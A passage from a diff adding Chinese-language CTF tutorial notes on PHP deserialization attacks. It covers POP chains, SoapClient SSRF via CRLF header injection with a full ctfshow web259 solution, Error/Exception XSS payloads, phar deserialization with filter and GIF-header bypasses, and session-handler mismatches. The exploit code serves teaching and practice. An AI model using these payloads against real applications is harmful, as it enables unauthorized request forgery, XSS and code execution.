+<th>Private</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>本类</td>
+<td>可以访问</td>
+<td>可以访问</td>
+<td>可以访问</td>
+</tr>
+<tr>
+<td>子类</td>
+<td>可以访问</td>
+<td>可以访问</td>
+<td>不能访问</td>
+</tr>
+<tr>
+<td>外部</td>
+<td>可以访问</td>
+<td>不能访问</td>
+<td>不能访问</td>
+</tr>
+</tbody>
+</table>
+<p><strong>魔术方法</strong></p>
+<table>
+<thead>
+<tr>
+<th>魔术方法</th>
+<th>何时调用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>__construct</td>
+<td>**创建新对象**时调用</td>
+</tr>
+<tr>
+<td>__wakeup</td>
+<td>在**使用 unserialize() 时**，会检查是否存在一个 __wakeup() 魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源</td>
+</tr>
+<tr>
+<td>__toString</td>
+<td>__toString() 方法用于定义一个类被**当成字符串时**该如何处理</td>
+</tr>
+<tr>
+<td>__destruct</td>
+<td>__destruct函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</td>
+</tr>
+<tr>
+<td>__invoke</td>
+<td>当尝试**以调用函数的方式调用一个对象**时， __invoke() 方法会被自动调用（类名+括号形式）</td>
+</tr>
+<tr>
+<td>__set</td>
+<td>**给不可访问属性赋值**时， __set() 会被调用</td>
+</tr>
+<tr>
+<td>__get</td>
+<td>**读取不可访问属性**赋值时， __get() 会被调用</td>
+</tr>
+<tr>
+<td>__unset</td>
+<td>对**不可访问属性调用unset()**时， __unset() 会被调用</td>
+</tr>
+<tr>
+<td>__isset</td>
+<td>在**不可访问的属性上调用isset()**或empty()触发</td>
+</tr>
+<tr>
+<td>__call</td>
+<td>在对象中调用一个**不可访问方法**时， __call() 会被调用</td>
+</tr>
+<tr>
+<td>__sleep</td>
+<td>执行**serialize()**时，先会调用这个函数</td>
+</tr>
+</tbody>
+</table>
+<h2 id="pop">POP链<a class="headerlink" href="#pop" title="Permanent link">&para;</a></h2>
+<p>如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+
+<span class="k">class</span> <span class="nc">Modifier</span> <span class="p">{</span>
+    <span class="k">protected</span>  <span class="nv">$var</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">append</span><span class="p">(</span><span class="nv">$value</span><span class="p">){</span>
+        <span class="k">include</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">Show</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s1">&#39;Welcome to &#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">&quot;hacker&quot;</span><span class="p">;</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&quot;index.php&quot;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
+        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nv">$function</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>最终是希望通过<code>Modifier</code>当中的<code>append</code>方法实现本地文件包含读取文件，回溯到调用它的<code>__invoke</code>，当我们**将对象调用为函数时触发**,发现在<code>Test</code>类当中的<code>__get</code>方法，再回溯到<code>Show</code>当中的<code>__toString</code>，再回溯到<code>Show</code>当中的<code>__wakeup</code>当中有preg_match可以触发<code>__toString</code></p>
+<h2 id="_2">对象注入<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>对象注入前提：</p>
+<blockquote>
+<p>1、<code>unserialize</code>的参数可控。
+2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">Person</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&quot;cat&quot;</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$age</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Person</span><span class="p">();</span>
+<span class="nv">$b</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="s1">&#39;dog&#39;</span><span class="p">;</span>
+<span class="nv">$b</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+<span class="c1">// O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:3:&quot;dog&quot;;s:3:&quot;age&quot;;i:3;}</span>
+<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>把序列化后字符串进行提交，反序列化时触发对象注入</p>
+<h2 id="php_1">PHP原生反序列化<a class="headerlink" href="#php_1" title="Permanent link">&para;</a></h2>
+<h3 id="soapclient">SoapClient<a class="headerlink" href="#soapclient" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。</p>
+<p>必须调用SoapClient不存在的方法，触发SoapClient的__call魔术方法。</p>
+<p>通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容</p>
+</blockquote>
+<p>首先在VPS上面开启监听<code>nc -lvvp 9328</code></p>
+<p>运行</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;uri&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;aaa&#39;</span><span class="p">,</span> <span class="s1">&#39;location&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;http://127.0.0.1:5555/path&#39;</span><span class="p">));</span>
+    <span class="nv">$b</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
+    <span class="nv">$c</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+    <span class="nv">$c</span><span class="o">-&gt;</span><span class="na">dotast</span><span class="p">();</span><span class="c1">//调用不存在的方法，让SoapClient调用__call</span>
+</code></pre></div>
+<p><img alt="259-1" src="259-1.png" /></p>
+<p><img alt="259-2" src="259-2.png" /></p>
+<p>vps会收到请求，其中的header存在</p>
+<div class="highlight"><pre><span></span><code><span class="x">SOAPAction: &quot;aaa#dotast&quot;</span>
+</code></pre></div>
+<p>因此我们可以尝试注入我们自己恶意构造的**CRLF**即插入**\r\n**，来控制POST请求头</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;uri&#39;</span><span class="o">=&gt;</span><span class="s2">&quot;aaa</span><span class="se">\r\n\r\n</span><span class="s2">bbb</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s1">&#39;location&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;http://127.0.0.1:5555/path&#39;</span><span class="p">));</span>
+    <span class="nv">$b</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
+    <span class="nv">$c</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+    <span class="nv">$c</span><span class="o">-&gt;</span><span class="na">dotast</span><span class="p">();</span>
+</code></pre></div>
+<p><img alt="259-3" src="259-3.png" /></p>
+<p><img alt="259-4" src="259-4.png" /></p>
+<p>但还有一个问题需要解决，POST数据指定请求头为<code>Content-Type:application/x-www-form-urlencoded</code>，我们需要控制<code>Content-Type</code>，但从上图中可以发现它位于<code>SOAPAtion</code>上方</p>
+<p>继续往上，可以发现<code>User-Agent</code>位于<code>Content-Type</code>上方，这个位置也可以进行注入，所以我们再<code>User-Agent</code>进行注入</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$post_string</span> <span class="o">=</span> <span class="s2">&quot;dotast=cool&quot;</span><span class="p">;</span>
+    <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;location&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;http://127.0.0.1:5555/path&#39;</span><span class="p">,</span> <span class="s1">&#39;user_agent&#39;</span><span class="o">=&gt;</span><span class="s2">&quot;dotast</span><span class="se">\r\n</span><span class="s2">Content-Type:application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="s2">&quot;Content-Length: &quot;</span><span class="o">.</span><span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$post_string</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$post_string</span><span class="p">,</span> <span class="s1">&#39;uri&#39;</span><span class="o">=&gt;</span><span class="s2">&quot;aaa&quot;</span><span class="p">));</span>
+    <span class="nv">$b</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
+    <span class="nv">$c</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+    <span class="nv">$c</span><span class="o">-&gt;</span><span class="na">dotast</span><span class="p">();</span>
+</code></pre></div>
+<p><img alt="259-5" src="259-5.png" /></p>
+<p><img alt="259-6" src="259-6.png" /></p>
+<p>如图，构造任意post请求成功！到此，一系列流程都弄懂后，我们回到ctfshow-web259题目本身</p>
+<p><strong>flag.php</strong></p>
+<div class="highlight"><pre><span></span><code><span class="x">$xff = explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);</span>
+<span class="x">array_pop($xff);</span>
+<span class="x">$ip = array_pop($xff);</span>
+
+
+<span class="x">if($ip!==&#39;127.0.0.1&#39;){</span>
+<span class="x">    die(&#39;error&#39;);</span>
+<span class="x">}else{</span>
+<span class="x">    $token = $_POST[&#39;token&#39;];</span>
+<span class="x">    if($token==&#39;ctfshow&#39;){</span>
+<span class="x">        file_put_contents(&#39;flag.txt&#39;,$flag);</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</code></pre></div>
+<p><strong>index.php</strong></p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="nv">$vip</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vip&#39;</span><span class="p">]);</span>
+<span class="c1">//vip can get flag one key</span>
+<span class="nv">$vip</span><span class="o">-&gt;</span><span class="na">getFlag</span><span class="p">();</span>
+</code></pre></div>
+<p>利用ssrf访问flag.php，然后构造post数据<code>token=ctfshow</code>还有xff请求头，paylaod如下</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$post_string</span> <span class="o">=</span> <span class="s2">&quot;token=ctfshow&quot;</span><span class="p">;</span>
+    <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;location&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;http://127.0.0.1/flag.php&#39;</span><span class="p">,</span> <span class="s1">&#39;user_agent&#39;</span><span class="o">=&gt;</span><span class="s2">&quot;dotast</span><span class="se">\r\n</span><span class="s2">Content-Type:application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="s2">&quot;X-Forwarded-For: 127.0.0.1,127.0.0.1</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="s2">&quot;Content-Length: &quot;</span><span class="o">.</span><span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$post_string</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$post_string</span><span class="p">,</span> <span class="s1">&#39;uri&#39;</span><span class="o">=&gt;</span><span class="s2">&quot;aaa&quot;</span><span class="p">));</span>
+    <span class="nv">$b</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+</code></pre></div>
+<p>这里<code>X-Forwarded-For</code>里面需要两个<code>127.0.0.1</code>的原因是docker环境cloudfare代理所导致</p>
+<p>运行php</p>
+<p><img alt="259-7" src="259-7.png" /></p>
+<p>get参数<code>vip</code>传入</p>
+<p><img alt="259-8" src="259-8.png" /></p>
+<p>再访问flag.txt就有了</p>
+<p><img alt="259-9" src="259-9.png" /></p>
+<h3 id="error">Error<a class="headerlink" href="#error" title="Permanent link">&para;</a></h3>
+<p>Error类就是php的一个内置类用于自动自定义一个<code>Error</code>，在php7的环境下可能会造成一个<code>xss</code>漏洞，因为它内置有一个<code>toString</code>的方法。</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">];</span>
+<span class="k">echo</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</code></pre></div>
+<p>构造poc</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Error</span><span class="p">(</span><span class="s2">&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;</span><span class="p">);</span>
+    <span class="nv">$b</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>  
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>将序列化后的字符串传入test变量即可**造成弹窗**</p>
+<p>Exception类跟Error类原理一样，但是也适用于PHP5</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nv">$x</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;</span><span class="p">);</span>
+    <span class="nv">$y</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$x</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$y</span><span class="p">);</span>  
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<h2 id="pharweb276">Phar反序列化web276<a class="headerlink" href="#pharweb276" title="Permanent link">&para;</a></h2>
+<h3 id="_3">原理<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data</p>
+<p>当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容</p>
+<h3 id="phar">phar文件<a class="headerlink" href="#phar" title="Permanent link">&para;</a></h3>
+<p>PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件</p>
+<p>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。<code>phar://</code>就是一种内置的流包装器</p>
+<p>php中一些常见的流包装器如下：</p>
+<div class="highlight"><pre><span></span><code><span class="x">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span>
+<span class="x">http:// — 访问 HTTP(s) 网址</span>
+<span class="x">ftp:// — 访问 FTP(s) URLs</span>
+<span class="x">php:// — 访问各个输入/输出流（I/O streams）</span>
+<span class="x">zlib:// — 压缩流</span>
+<span class="x">data:// — 数据（RFC 2397）</span>
+<span class="x">glob:// — 查找匹配的文件路径模式</span>
+<span class="x">phar:// — PHP 归档</span>
+<span class="x">ssh2:// — Secure Shell 2</span>
+<span class="x">rar:// — RAR</span>
+<span class="x">ogg:// — 音频流</span>
+<span class="x">expect:// — 处理交互式的流</span>
+</code></pre></div>
+<h3 id="phar_1">phar文件结构<a class="headerlink" href="#phar_1" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="x">stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?&gt; 结尾，否则无法识别。xxx可以为自定义内容。</span>
+<span class="x">manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。</span>
+<span class="x">content:被压缩文件的内容</span>
+<span class="x">signature (可空):签名，放在末尾。</span>
+</code></pre></div>
+<h3 id="phar-demo">phar demo<a class="headerlink" href="#phar-demo" title="Permanent link">&para;</a></h3>
+<p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p>
+<blockquote>
+<p>要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">TestObject</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$data</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">//@unlink(&quot;phar.phar&quot;);</span>
+<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&quot;phar.phar&quot;</span><span class="p">);</span> <span class="c1">//后缀名必须为phar</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span><span class="p">);</span> <span class="c1">//设置stub</span>
+
+<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TestObject</span><span class="p">();</span>
+<span class="nv">$o</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s1">&#39;hello&#39;</span><span class="p">;</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义的meta-data存入manifest</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&quot;test.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;test&quot;</span><span class="p">);</span> <span class="c1">//添加要压缩的文件</span>
+<span class="c1">//签名自动计算</span>
+<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>访问后，会生成一个phar.phar在当前目录下，可以看到meta-data是以序列化的形式存储的。</p>
+<p>通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，部分受影响的函数列表：</p>
+<ul>
+<li><code>fileatime</code> / <code>filectime</code> / <code>filemtime</code></li>
+<li><code>stat</code> / <code>fileinode</code> / <code>fileowner</code> / <code>filegroup</code> / <code>fileperms</code></li>
+<li><code>file</code> / <code>file_get_contents</code> / <code>readfile</code> / `fopen``</li>
+<li><code>file_exists</code> / <code>is_dir</code> / <code>is_executable</code> / <code>is_file</code> / <code>is_link</code> / <code>is_readable</code> / <code>is_writeable</code> / <code>is_writable</code></li>
+<li><code>parse_ini_file</code></li>
+<li><code>unlink</code></li>
+<li><code>copy</code></li>
+</ul>
+<p>以常用的函数<code>file_get_contents()</code>函数举例：</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">TestObject</span><span class="p">{</span>
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">data</span><span class="p">;</span>   <span class="c1">// TODO: Implement __destruct() method.</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;phar://phar.phar/test.txt&#39;</span><span class="p">);</span>
+</code></pre></div>
+<p>上述例程会输出hello</p>
+<h3 id="_4">漏洞利用条件<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<ol>
+<li>phar文件要能够上传到服务器端。</li>
+<li>要有可用的魔术方法作为“跳板”。</li>
+<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
+</ol>
+<h3 id="_5">绕过方式<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>当环境限制了phar不能出现在前面的字符里。可以使用<code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</p>
+<div class="highlight"><pre><span></span><code><span class="x">compress.bzip://phar:///test.phar/test.txt</span>
+<span class="x">compress.bzip2://phar:///test.phar/test.txt</span>
+<span class="x">compress.zlib://phar:///home/sx/test.phar/test.txt</span>
+<span class="x">php://filter/resource=phar:///test.phar/test.txt</span>
+<span class="x">php://filter/read=convert.base64-encode/resource=phar://test.phar/test.txt</span>
+</code></pre></div>
+<p>GIF格式验证可以通过在文件头部添加GIF89a绕过</p>
+<div class="highlight"><pre><span></span><code><span class="x">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;</span><span class="cp">&lt;?php</span> <span class="nx">__HALT_COMPILER</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="x">&quot;); //设置stub</span>
+</code></pre></div>
+<p>生成一个phar.phar，修改后缀名为phar.gif</p>
+<p>然后上传，通过<code>file_get_contents</code>或者<code>unlink</code>等方法解包触发反序列化（通常使用在没有明显反序列化传参的题目中）</p>
+<h2 id="php-session">php-session反序列化<a class="headerlink" href="#php-session" title="Permanent link">&para;</a></h2>
+<h3 id="session">session介绍<a class="headerlink" href="#session" title="Permanent link">&para;</a></h3>
+<p>当第一次访问网站时，<code>session_start()</code>函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。</p>
+<p>同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。</p>
+<p>当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时<code>session_start()</code>函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>
+<h3 id="session_1">session的存储<a class="headerlink" href="#session_1" title="Permanent link">&para;</a></h3>
+<p>php中的session中的内容并不是放在内存中的，默认是以**文件**的方式来存储的（由配置项<code>session.save_handler</code>定义）</p>
+<p>存储的文件是以<code>sess_sessionid</code>来进行命名的</p>
+<p>除了默认的php引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同</p>
+<table>
+<thead>
+<tr>
+<th>处理引擎名称</th>
+<th>储存格式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>php</td>
+<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_binary</td>
+<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_serialize</td>
+<td>经过serialize()函数序列化处理的**数组**</td>
+</tr>
+</tbody>
+</table>
+<p>即在**默认引擎**情况下，<code>$_SESSION['name'] = 's1ng';</code>代码会在<code>/var/lib/php/sessions/</code>(也可能在<code>/tmp/sess_</code>)下创建<code>sess_at9ih163p9tadfhdn8f721l7s9</code>文件，文件的内容为<code>name|s:4:"s1ng";</code></p>
+<p>若在**php_serialize引擎**下：</p>
+<div class="highlight"><pre><span></span><code><span class="x">ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</span>
+<span class="x">session_start();</span>
+<span class="x">$_SESSION[&#39;name&#39;] = &#39;s1ng&#39;;</span>
+</code></pre></div>
+<p>可以得到：</p>
+<div class="highlight"><pre><span></span><code><span class="x">;root@SYY:/var/lib/php/sessions# cat sess_at9ih163p9tadfhdn8f721l7s9</span>
+<span class="x">a:1:{s:4:&quot;name&quot;;s:4:&quot;s1ng&quot;;}</span>
+</code></pre></div>
+<p><code>a:1</code>是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key和value都会进行序列化。</p>
+<p>在**php_binary引擎**下：</p>
+<div class="highlight"><pre><span></span><code><span class="x">ini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;);</span>
+<span class="x">session_start();</span>
+<span class="x">$_SESSION[&#39;name&#39;] = &#39;s1ng&#39;;</span>
+</code></pre></div>
+<p>输出：</p>
+<div class="highlight"><pre><span></span><code><span class="x">root@SYY:/var/lib/php/sessions# cat sess_at9ih163p9tadfhdn8f721l7s9</span>
+<span class="x">（这里有一个ascii为4的不可显字符）names:4:&quot;s1ng&quot;;</span>
+</code></pre></div>
+<h3 id="php-session_1">php-session反序列化漏洞成因<a class="headerlink" href="#php-session_1" title="Permanent link">&para;</a></h3>
+<p>PHP在反序列化存储的<code>$_SESSION</code>数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确的反序列化。</p>
+<p>通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法</p>
+<div class="highlight"><pre><span></span><code><span class="x">$_SESSION[&#39;hello&#39;] = &#39;|O:8:&quot;stdClass&quot;:0:{}&#39;;</span>
+</code></pre></div>
+<p>上面的 $_SESSION 数据，在存储时使用的序列化处理器为 php_serialize，存储的格式如下:</p>
+<div class="highlight"><pre><span></span><code><span class="x">a:1:{s:5:&quot;hello&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:{}&quot;;}</span>
+</code></pre></div>
+<p>在读取数据时如果用的反序列化处理器不是 php_serialize，而是 php 的话，那么反序列化后的数据将会变成：</p>
+<div class="highlight"><pre><span></span><code><span class="x">array(1) {</span>
+<span class="x">  [&quot;a:1:{s:5:&quot;hello&quot;;s:20:&quot;&quot;]=&gt;</span>
